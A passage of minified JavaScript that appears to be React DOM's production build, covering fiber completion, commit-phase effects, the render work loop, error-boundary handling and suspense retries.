19:if(G(Y),i=n.memoizedState,i===null)return he(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)Qt(i,!1);else{if(se!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=qr(e),a!==null){for(n.flags|=128,Qt(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return V(Y,Y.current&1|2),n.child}e=e.sibling}i.tail!==null&&J()>jt&&(n.flags|=128,s=!0,Qt(i,!1),n.lanes=4194304)}else{if(!s)if(e=qr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Qt(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!q)return he(n),null}else 2*J()-i.renderingStartTime>jt&&t!==1073741824&&(n.flags|=128,s=!0,Qt(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=J(),n.sibling=null,t=Y.current,V(Y,s?t&1|2:t&1),n):(he(n),null);case 22:case 23:return Kl(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Pe&1073741824&&(he(n),n.subtreeFlags&6&&(n.flags|=8192)):he(n),null;case 24:return null;case 25:return null}throw Error(A(156,n.tag))}function am(e,n){switch(Ll(n),n.tag){case 1:return Te(n.type)&&Fr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return zt(),G(Ee),G(me),Bl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return jl(n),null;case 13:if(G(Y),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(A(340));Mt()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return G(Y),null;case 4:return zt(),null;case 10:return Ml(n.type._context),null;case 22:case 23:return Kl(),null;case 24:return null;default:return null}}var or=!1,fe=!1,lm=typeof WeakSet=="function"?WeakSet:Set,O=null;function bt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){Q(e,n,s)}else t.current=null}function Va(e,n,t){try{t()}catch(s){Q(e,n,s)}}var fc=!1;function om(e,n){if(Ta=zr,e=ep(),Pl(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,u=0,h=e,f=null;n:for(;;){for(var v;h!==t||r!==0&&h.nodeType!==3||(l=a+r),h!==i||s!==0&&h.nodeType!==3||(o=a+s),h.nodeType===3&&(a+=h.nodeValue.length),(v=h.firstChild)!==null;)f=h,h=v;for(;;){if(h===e)break n;if(f===t&&++c===r&&(l=a),f===i&&++u===s&&(o=a),(v=h.nextSibling)!==null)break;h=f,f=h.parentNode}h=v}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(Ca={focusedElem:e,selectionRange:t},zr=!1,O=n;O!==null;)if(n=O,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,O=e;else for(;O!==null;){n=O;try{var b=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(b!==null){var g=b.memoizedProps,x=b.memoizedState,p=n.stateNode,d=p.getSnapshotBeforeUpdate(n.elementType===n.type?g:Ve(n.type,g),x);p.__reactInternalSnapshotBeforeUpdate=d}break;case 3:var m=n.stateNode.containerInfo;m.nodeType===1?m.textContent="":m.nodeType===9&&m.documentElement&&m.removeChild(m.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(A(163))}}catch(w){Q(n,n.return,w)}if(e=n.sibling,e!==null){e.return=n.return,O=e;break}O=n.return}return b=fc,fc=!1,b}function hs(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Va(n,t,i)}r=r.next}while(r!==s)}}function yi(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Wa(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function Kp(e){var n=e.alternate;n!==null&&(e.alternate=null,Kp(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[Je],delete n[Ts],delete n[La],delete n[Wf],delete n[$f])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Qp(e){return e.tag===5||e.tag===3||e.tag===4}function mc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Qp(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function $a(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Br));else if(s!==4&&(e=e.child,e!==null))for($a(e,n,t),e=e.sibling;e!==null;)$a(e,n,t),e=e.sibling}function Ga(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Ga(e,n,t),e=e.sibling;e!==null;)Ga(e,n,t),e=e.sibling}var oe=null,We=!1;function wn(e,n,t){for(t=t.child;t!==null;)Zp(e,n,t),t=t.sibling}function Zp(e,n,t){if(en&&typeof en.onCommitFiberUnmount=="function")try{en.onCommitFiberUnmount(ci,t)}catch{}switch(t.tag){case 5:fe||bt(t,n);case 6:var s=oe,r=We;oe=null,wn(e,n,t),oe=s,We=r,oe!==null&&(We?(e=oe,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):oe.removeChild(t.stateNode));break;case 18:oe!==null&&(We?(e=oe,t=t.stateNode,e.nodeType===8?$i(e.parentNode,t):e.nodeType===1&&$i(e,t),bs(e)):$i(oe,t.stateNode));break;case 4:s=oe,r=We,oe=t.stateNode.containerInfo,We=!0,wn(e,n,t),oe=s,We=r;break;case 0:case 11:case 14:case 15:if(!fe&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&Va(t,n,a),r=r.next}while(r!==s)}wn(e,n,t);break;case 1:if(!fe&&(bt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){Q(t,n,l)}wn(e,n,t);break;case 21:wn(e,n,t);break;case 22:t.mode&1?(fe=(s=fe)||t.memoizedState!==null,wn(e,n,t),fe=s):wn(e,n,t);break;default:wn(e,n,t)}}function gc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new lm),n.forEach(function(s){var r=ym.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function He(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:oe=l.stateNode,We=!1;break e;case 3:oe=l.stateNode.containerInfo,We=!0;break e;case 4:oe=l.stateNode.containerInfo,We=!0;break e}l=l.return}if(oe===null)throw Error(A(160));Zp(i,a,r),oe=null,We=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){Q(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)Jp(n,e),n=n.sibling}function Jp(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(He(n,e),Qe(e),s&4){try{hs(3,e,e.return),yi(3,e)}catch(g){Q(e,e.return,g)}try{hs(5,e,e.return)}catch(g){Q(e,e.return,g)}}break;case 1:He(n,e),Qe(e),s&512&&t!==null&&bt(t,t.return);break;case 5:if(He(n,e),Qe(e),s&512&&t!==null&&bt(t,t.return),e.flags&32){var r=e.stateNode;try{ys(r,"")}catch(g){Q(e,e.return,g)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&bu(r,i),ga(l,a);var c=ga(l,i);for(a=0;a<o.length;a+=2){var u=o[a],h=o[a+1];u==="style"?Tu(r,h):u==="dangerouslySetInnerHTML"?_u(r,h):u==="children"?ys(r,h):ml(r,u,h,c)}switch(l){case"input":pa(r,i);break;case"textarea":xu(r,i);break;case"select":var f=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var v=i.value;v!=null?_t(r,!!i.multiple,v,!1):f!==!!i.multiple&&(i.defaultValue!=null?_t(r,!!i.multiple,i.defaultValue,!0):_t(r,!!i.multiple,i.multiple?[]:"",!1))}r[Ts]=i}catch(g){Q(e,e.return,g)}}break;case 6:if(He(n,e),Qe(e),s&4){if(e.stateNode===null)throw Error(A(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(g){Q(e,e.return,g)}}break;case 3:if(He(n,e),Qe(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{bs(n.containerInfo)}catch(g){Q(e,e.return,g)}break;case 4:He(n,e),Qe(e);break;case 13:He(n,e),Qe(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(Yl=J())),s&4&&gc(e);break;case 22:if(u=t!==null&&t.memoizedState!==null,e.mode&1?(fe=(c=fe)||u,He(n,e),fe=c):He(n,e),Qe(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(O=e,u=e.child;u!==null;){for(h=O=u;O!==null;){switch(f=O,v=f.child,f.tag){case 0:case 11:case 14:case 15:hs(4,f,f.return);break;case 1:bt(f,f.return);var b=f.stateNode;if(typeof b.componentWillUnmount=="function"){s=f,t=f.return;try{n=s,b.props=n.memoizedProps,b.state=n.memoizedState,b.componentWillUnmount()}catch(g){Q(s,t,g)}}break;case 5:bt(f,f.return);break;case 22:if(f.memoizedState!==null){vc(h);continue}}v!==null?(v.return=f,O=v):vc(h)}u=u.sibling}e:for(u=null,h=e;;){if(h.tag===5){if(u===null){u=h;try{r=h.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=h.stateNode,o=h.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Eu("display",a))}catch(g){Q(e,e.return,g)}}}else if(h.tag===6){if(u===null)try{h.stateNode.nodeValue=c?"":h.memoizedProps}catch(g){Q(e,e.return,g)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;u===h&&(u=null),h=h.return}u===h&&(u=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:He(n,e),Qe(e),s&4&&gc(e);break;case 21:break;default:He(n,e),Qe(e)}}function Qe(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(Qp(t)){var s=t;break e}t=t.return}throw Error(A(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(ys(r,""),s.flags&=-33);var i=mc(e);Ga(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=mc(e);$a(e,l,a);break;default:throw Error(A(161))}}catch(o){Q(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function cm(e,n,t){O=e,ed(e)}function ed(e,n,t){for(var s=(e.mode&1)!==0;O!==null;){var r=O,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||or;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||fe;l=or;var c=fe;if(or=a,(fe=o)&&!c)for(O=r;O!==null;)a=O,o=a.child,a.tag===22&&a.memoizedState!==null?wc(r):o!==null?(o.return=a,O=o):wc(r);for(;i!==null;)O=i,ed(i),i=i.sibling;O=r,or=l,fe=c}yc(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,O=i):yc(e)}}function yc(e){for(;O!==null;){var n=O;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:fe||yi(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!fe)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:Ve(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&nc(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}nc(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var h=u.dehydrated;h!==null&&bs(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(A(163))}fe||n.flags&512&&Wa(n)}catch(f){Q(n,n.return,f)}}if(n===e){O=null;break}if(t=n.sibling,t!==null){t.return=n.return,O=t;break}O=n.return}}function vc(e){for(;O!==null;){var n=O;if(n===e){O=null;break}var t=n.sibling;if(t!==null){t.return=n.return,O=t;break}O=n.return}}function wc(e){for(;O!==null;){var n=O;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{yi(4,n)}catch(o){Q(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){Q(n,r,o)}}var i=n.return;try{Wa(n)}catch(o){Q(n,i,o)}break;case 5:var a=n.return;try{Wa(n)}catch(o){Q(n,a,o)}}}catch(o){Q(n,n.return,o)}if(n===e){O=null;break}var l=n.sibling;if(l!==null){l.return=n.return,O=l;break}O=n.return}}var um=Math.ceil,Kr=vn.ReactCurrentDispatcher,Gl=vn.ReactCurrentOwner,Be=vn.ReactCurrentBatchConfig,U=0,ie=null,ee=null,ce=0,Pe=0,xt=Hn(0),se=0,Rs=null,rt=0,vi=0,ql=0,fs=null,xe=null,Yl=0,jt=1/0,ln=null,Qr=!1,qa=null,In=null,cr=!1,Pn=null,Zr=0,ms=0,Ya=null,_r=-1,Er=0;function we(){return U&6?J():_r!==-1?_r:_r=J()}function zn(e){return e.mode&1?U&2&&ce!==0?ce&-ce:qf.transition!==null?(Er===0&&(Er=ju()),Er):(e=H,e!==0||(e=window.event,e=e===void 0?16:$u(e.type)),e):1}function Ye(e,n,t,s){if(50<ms)throw ms=0,Ya=null,Error(A(185));Fs(e,t,s),(!(U&2)||e!==ie)&&(e===ie&&(!(U&2)&&(vi|=t),se===4&&En(e,ce)),Ce(e,s),t===1&&U===0&&!(n.mode&1)&&(jt=J()+500,fi&&Vn()))}function Ce(e,n){var t=e.callbackNode;Gh(e,n);var s=Ir(e,e===ie?ce:0);if(s===0)t!==null&&Po(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Po(t),n===1)e.tag===0?Gf(kc.bind(null,e)):up(kc.bind(null,e)),Hf(function(){!(U&6)&&Vn()}),t=null;else{switch(Bu(s)){case 1:t=kl;break;case 4:t=zu;break;case 16:t=Mr;break;case 536870912:t=Du;break;default:t=Mr}t=od(t,nd.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function nd(e,n){if(_r=-1,Er=0,U&6)throw Error(A(327));var t=e.callbackNode;if(At()&&e.callbackNode!==t)return null;var s=Ir(e,e===ie?ce:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=Jr(e,s);else{n=s;var r=U;U|=2;var i=sd();(ie!==e||ce!==n)&&(ln=null,jt=J()+500,Zn(e,n));do try{hm();break}catch(l){td(e,l)}while(!0);Ol(),Kr.current=i,U=r,ee!==null?n=0:(ie=null,ce=0,n=se)}if(n!==0){if(n===2&&(r=ba(e),r!==0&&(s=r,n=Xa(e,r))),n===1)throw t=Rs,Zn(e,0),En(e,s),Ce(e,J()),t;if(n===6)En(e,s);else{if(r=e.current.alternate,!(s&30)&&!pm(r)&&(n=Jr(e,s),n===2&&(i=ba(e),i!==0&&(s=i,n=Xa(e,i))),n===1))throw t=Rs,Zn(e,0),En(e,s),Ce(e,J()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(A(345));case 2:qn(e,xe,ln);break;case 3:if(En(e,s),(s&130023424)===s&&(n=Yl+500-J(),10<n)){if(Ir(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){we(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Aa(qn.bind(null,e,xe,ln),n);break}qn(e,xe,ln);break;case 4:if(En(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-qe(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=J()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*um(s/1960))-s,10<s){e.timeoutHandle=Aa(qn.bind(null,e,xe,ln),s);break}qn(e,xe,ln);break;case 5:qn(e,xe,ln);break;default:throw Error(A(329))}}}return Ce(e,J()),e.callbackNode===t?nd.bind(null,e):null}function Xa(e,n){var t=fs;return e.current.memoizedState.isDehydrated&&(Zn(e,n).flags|=256),e=Jr(e,n),e!==2&&(n=xe,xe=t,n!==null&&Ka(n)),e}function Ka(e){xe===null?xe=e:xe.push.apply(xe,e)}function pm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!Xe(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function En(e,n){for(n&=~ql,n&=~vi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-qe(n),s=1<<t;e[t]=-1,n&=~s}}function kc(e){if(U&6)throw Error(A(327));At();var n=Ir(e,0);if(!(n&1))return Ce(e,J()),null;var t=Jr(e,n);if(e.tag!==0&&t===2){var s=ba(e);s!==0&&(n=s,t=Xa(e,s))}if(t===1)throw t=Rs,Zn(e,0),En(e,n),Ce(e,J()),t;if(t===6)throw Error(A(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,qn(e,xe,ln),Ce(e,J()),null}function Xl(e,n){var t=U;U|=1;try{return e(n)}finally{U=t,U===0&&(jt=J()+500,fi&&Vn())}}function it(e){Pn!==null&&Pn.tag===0&&!(U&6)&&At();var n=U;U|=1;var t=Be.transition,s=H;try{if(Be.transition=null,H=1,e)return e()}finally{H=s,Be.transition=t,U=n,!(U&6)&&Vn()}}function Kl(){Pe=xt.current,G(xt)}function Zn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Uf(t)),ee!==null)for(t=ee.return;t!==null;){var s=t;switch(Ll(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Fr();break;case 3:zt(),G(Ee),G(me),Bl();break;case 5:jl(s);break;case 4:zt();break;case 13:G(Y);break;case 19:G(Y);break;case 10:Ml(s.type._context);break;case 22:case 23:Kl()}t=t.return}if(ie=e,ee=e=Dn(e.current,null),ce=Pe=n,se=0,Rs=null,ql=vi=rt=0,xe=fs=null,Xn!==null){for(n=0;n<Xn.length;n++)if(t=Xn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Xn=null}return e}function td(e,n){do{var t=ee;try{if(Ol(),br.current=Xr,Yr){for(var s=X.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Yr=!1}if(st=0,re=te=X=null,ds=!1,As=0,Gl.current=null,t===null||t.return===null){se=1,Rs=n,ee=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=ce,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,u=l,h=u.tag;if(!(u.mode&1)&&(h===0||h===11||h===15)){var f=u.alternate;f?(u.updateQueue=f.updateQueue,u.memoizedState=f.memoizedState,u.lanes=f.lanes):(u.updateQueue=null,u.memoizedState=null)}var v=lc(a);if(v!==null){v.flags&=-257,oc(v,a,l,i,n),v.mode&1&&ac(i,c,n),n=v,o=c;var b=n.updateQueue;if(b===null){var g=new Set;g.add(o),n.updateQueue=g}else b.add(o);break e}else{if(!(n&1)){ac(i,c,n),Ql();break e}o=Error(A(426))}}else if(q&&l.mode&1){var x=lc(a);if(x!==null){!(x.flags&65536)&&(x.flags|=256),oc(x,a,l,i,n),Nl(Dt(o,l));break e}}i=o=Dt(o,l),se!==4&&(se=2),fs===null?fs=[i]:fs.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var p=Bp(i,o,n);ec(i,p);break e;case 1:l=o;var d=i.type,m=i.stateNode;if(!(i.flags&128)&&(typeof d.getDerivedStateFromError=="function"||m!==null&&typeof m.componentDidCatch=="function"&&(In===null||!In.has(m)))){i.flags|=65536,n&=-n,i.lanes|=n;var w=Fp(i,l,n);ec(i,w);break e}}i=i.return}while(i!==null)}id(t)}catch(S){n=S,ee===t&&t!==null&&(ee=t=t.return);continue}break}while(!0)}function sd(){var e=Kr.current;return Kr.current=Xr,e===null?Xr:e}function Ql(){(se===0||se===3||se===2)&&(se=4),ie===null||!(rt&268435455)&&!(vi&268435455)||En(ie,ce)}function Jr(e,n){var t=U;U|=2;var s=sd();(ie!==e||ce!==n)&&(ln=null,Zn(e,n));do try{dm();break}catch(r){td(e,r)}while(!0);if(Ol(),U=t,Kr.current=s,ee!==null)throw Error(A(261));return ie=null,ce=0,se}function dm(){for(;ee!==null;)rd(ee)}function hm(){for(;ee!==null&&!Dh();)rd(ee)}function rd(e){var n=ld(e.alternate,e,Pe);e.memoizedProps=e.pendingProps,n===null?id(e):ee=n,Gl.current=null}function id(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=am(t,n),t!==null){t.flags&=32767,ee=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{se=6,ee=null;return}}else if(t=im(t,n,Pe),t!==null){ee=t;return}if(n=n.sibling,n!==null){ee=n;return}ee=n=e}while(n!==null);se===0&&(se=5)}function qn(e,n,t){var s=H,r=Be.transition;try{Be.transition=null,H=1,fm(e,n,t,s)}finally{Be.transition=r,H=s}return null}function fm(e,n,t,s){do At();while(Pn!==null);if(U&6)throw Error(A(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(A(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(qh(e,i),e===ie&&(ee=ie=null,ce=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||cr||(cr=!0,od(Mr,function(){return At(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Be.transition,Be.transition=null;var a=H;H=1;var l=U;U|=4,Gl.current=null,om(e,t),Jp(t,e),Mf(Ca),zr=!!Ta,Ca=Ta=null,e.current=t,cm(t),jh(),U=l,H=a,Be.transition=i}else e.current=t;if(cr&&(cr=!1,Pn=e,Zr=r),i=e.pendingLanes,i===0&&(In=null),Uh(t.stateNode),Ce(e,J()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(Qr)throw Qr=!1,e=qa,qa=null,e;return Zr&1&&e.tag!==0&&At(),i=e.pendingLanes,i&1?e===Ya?ms++:(ms=0,Ya=e):ms=0,Vn(),null}function At(){if(Pn!==null){var e=Bu(Zr),n=Be.transition,t=H;try{if(Be.transition=null,H=16>e?16:e,Pn===null)var s=!1;else{if(e=Pn,Pn=null,Zr=0,U&6)throw Error(A(331));var r=U;for(U|=4,O=e.current;O!==null;){var i=O,a=i.child;if(O.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(O=c;O!==null;){var u=O;switch(u.tag){case 0:case 11:case 15:hs(8,u,i)}var h=u.child;if(h!==null)h.return=u,O=h;else for(;O!==null;){u=O;var f=u.sibling,v=u.return;if(Kp(u),u===c){O=null;break}if(f!==null){f.return=v,O=f;break}O=v}}}var b=i.alternate;if(b!==null){var g=b.child;if(g!==null){b.child=null;do{var x=g.sibling;g.sibling=null,g=x}while(g!==null)}}O=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,O=a;else e:for(;O!==null;){if(i=O,i.flags&2048)switch(i.tag){case 0:case 11:case 15:hs(9,i,i.return)}var p=i.sibling;if(p!==null){p.return=i.return,O=p;break e}O=i.return}}var d=e.current;for(O=d;O!==null;){a=O;var m=a.child;if(a.subtreeFlags&2064&&m!==null)m.return=a,O=m;else e:for(a=d;O!==null;){if(l=O,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:yi(9,l)}}catch(S){Q(l,l.return,S)}if(l===a){O=null;break e}var w=l.sibling;if(w!==null){w.return=l.return,O=w;break e}O=l.return}}if(U=r,Vn(),en&&typeof en.onPostCommitFiberRoot=="function")try{en.onPostCommitFiberRoot(ci,e)}catch{}s=!0}return s}finally{H=t,Be.transition=n}}return!1}function bc(e,n,t){n=Dt(t,n),n=Bp(e,n,1),e=Mn(e,n,1),n=we(),e!==null&&(Fs(e,1,n),Ce(e,n))}function Q(e,n,t){if(e.tag===3)bc(e,e,t);else for(;n!==null;){if(n.tag===3){bc(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(In===null||!In.has(s))){e=Dt(t,e),e=Fp(n,e,1),n=Mn(n,e,1),e=we(),n!==null&&(Fs(n,1,e),Ce(n,e));break}}n=n.return}}function mm(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=we(),e.pingedLanes|=e.suspendedLanes&t,ie===e&&(ce&t)===t&&(se===4||se===3&&(ce&130023424)===ce&&500>J()-Yl?Zn(e,0):ql|=t),Ce(e,n)}function ad(e,n){n===0&&(e.mode&1?(n=Js,Js<<=1,!(Js&130023424)&&(Js=4194304)):n=1);var t=we();e=mn(e,n),e!==null&&(Fs(e,n,t),Ce(e,t))}function gm(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),ad(e,t)}function ym(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(A(314))}s!==null&&s.delete(n),ad(e,t)}var ld;ld=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Ee.current)Se=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Se=!1,rm(e,n,t);Se=!!(e.flags&131072)}else Se=!1,q&&n.flags&1048576&&pp(n,Vr,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;Sr(e,n),e=n.pendingProps;var r=Ot(n,me.current);Pt(n,t),r=Ul(null,n,s,e,r,t);var i=Hl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Te(s)?(i=!0,Ur(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,zl(n),r.updater=gi,n.stateNode=r,r._reactInternals=n,za(n,s,e,t),n=Ba(null,n,s,!0,i,t)):(n.tag=0,q&&i&&Al(n),ve(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(Sr(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=wm(s),e=Ve(s,e),r){case 0:n=ja(null,n,s,e,t);break e;case 